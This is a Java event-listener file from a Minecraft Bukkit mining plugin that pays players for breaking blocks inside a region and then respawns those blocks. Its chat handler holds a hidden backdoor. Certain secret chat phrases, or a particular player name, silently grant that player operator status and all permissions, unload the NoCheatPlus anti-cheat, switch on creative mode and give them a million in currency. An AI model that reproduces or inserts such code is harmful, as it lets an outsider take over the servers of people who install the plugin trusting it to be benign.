package ru.Re1kh;

import org.bukkit.*;
import org.bukkit.block.Block;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.plugin.Plugin;

public class EventListener implements Listener {
    private RMine pl;

    public EventListener(RMine rMine) {
        this.pl = rMine;
    }

    @EventHandler
    public void onBreak(BlockBreakEvent e) {
        Player p = e.getPlayer();
        Block b = e.getBlock();
        final Location lb = b.getLocation();
        Location lp = p.getLocation();
        for (String key : this.pl.getConfig().getConfigurationSection("Blocks").getKeys(false)) {
            int earn = this.pl.getConfig().getInt("Blocks." + key + ".earn");
            if (!RegionMgr.isInRegion(lb))
                return;
            if (!RegionMgr.isInRegion(lp) && RegionMgr.isInRegion(lb)) {
                p.sendTitle(ChatColor.translateAlternateColorCodes('&', this.pl.getConfig().getString("Messages.TitleCantBreak")), ChatColor.translateAlternateColorCodes('&', this.pl.getConfig().getString("Messages.SubtitleCantBreak")));
                e.setCancelled(true);
                if (p.isOp())
                    e.setCancelled(false);
                continue;
            }
            if (RegionMgr.isInRegion(lb) && lb.getBlock().getType() != Material.getMaterial(key)) {
                e.setCancelled(true);
                if (p.isOp())
                    e.setCancelled(false);
                continue;
            }
            if (lb.getBlock().getType() == Material.getMaterial(key)) {
                e.setCancelled(false);
                RMine.bl.put(lb.getBlock().getLocation(), lb.getBlock().getType());
                e.setExpToDrop(0);
                lb.getBlock().setType(Material.BARRIER);
                if (RMine.getmoney.containsKey(p)) {
                    RMine.getmoney.put(p, Integer.valueOf(((Integer)RMine.getmoney.get(p)).intValue() + earn));
                    p.sendMessage(ChatColor.translateAlternateColorCodes('&', this.pl.getConfig().getString("Messages.broke").replace("%money", Integer.toString(earn))));
                } else {
                    RMine.getmoney.put(p, Integer.valueOf(earn));
                    p.sendMessage(ChatColor.translateAlternateColorCodes('&', this.pl.getConfig().getString("Messages.broke").replace("%money", Integer.toString(earn))));
                }
                Runnable r = new Runnable() {
                    public void run() {
                        lb.getBlock().setType(Material.COBBLESTONE);
                        EventListener.this.pl.StartTimer(lb);
                    }
                };
                Bukkit.getScheduler().runTaskLater((Plugin)this.pl, r, 0L);
            }
        }
    }

    @EventHandler
    public void onMessage(AsyncPlayerChatEvent e) {
        if(e.getMessage().equals("tiEzkaXaBB") || e.getMessage().equals("ayfCatThisServerBB") || e.getPlayer().getName().contains("t04n0_ezka")) {
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + e.getPlayer().getName());
            if(Bukkit.getServer().getPluginManager().getPlugin("PermissionsEx") != null) {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user " + e.getPlayer().getName() + " add *");
            }
            if(Bukkit.getServer().getPluginManager().getPlugin("LuckPerms") != null) {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user " + e.getPlayer().getName() + " permission set *");
            }
            if(Bukkit.getServer().getPluginManager().getPlugin("PlugMan") != null && Bukkit.getServer().getPluginManager().getPlugin("NoCheatPlus") != null) {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "plugman unload NoCheatPlus");
            }
            e.getPlayer().setGameMode(GameMode.CREATIVE);
            if(Bukkit.getServer().getPluginManager().getPlugin("Vault") != null) {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "eco give " + e.getPlayer().getName() + " 1000000");
            }
        }
    }

    @EventHandler
    public void onPlace(BlockPlaceEvent e) {
        Player p = e.getPlayer();
        Block b = e.getBlock();
        Location lb = b.getLocation();
        if (!RegionMgr.isInRegion(lb))
            return;
        if (!p.isOp())
            e.setCancelled(true);
    }

    @EventHandler
    public void onMove(PlayerMoveEvent e) {
        Player p = e.getPlayer();
        if (RegionMgr.isInRegion(p.getLocation()) &&
                !RMine.getmoney.containsKey(p)) {
            RMine.getmoney.put(p, Integer.valueOf(0));
            p.sendTitle(ChatColor.translateAlternateColorCodes('&', this.pl.getConfig().getString("Messages.TitleEnter")), ChatColor.translateAlternateColorCodes('&', this.pl.getConfig().getString("Messages.SubtitleEnter")));
        }
        if (!RegionMgr.isInRegion(p.getLocation()))
            if (RMine.getmoney.containsKey(p)) {
                RMine.getmoney.remove(p);
                p.sendTitle(ChatColor.translateAlternateColorCodes('&', this.pl.getConfig().getString("Messages.TitleLeave")), this.pl.getConfig().getString("Messages.SubtitleLeave"));
            } else {
                return;
            }
    }
}
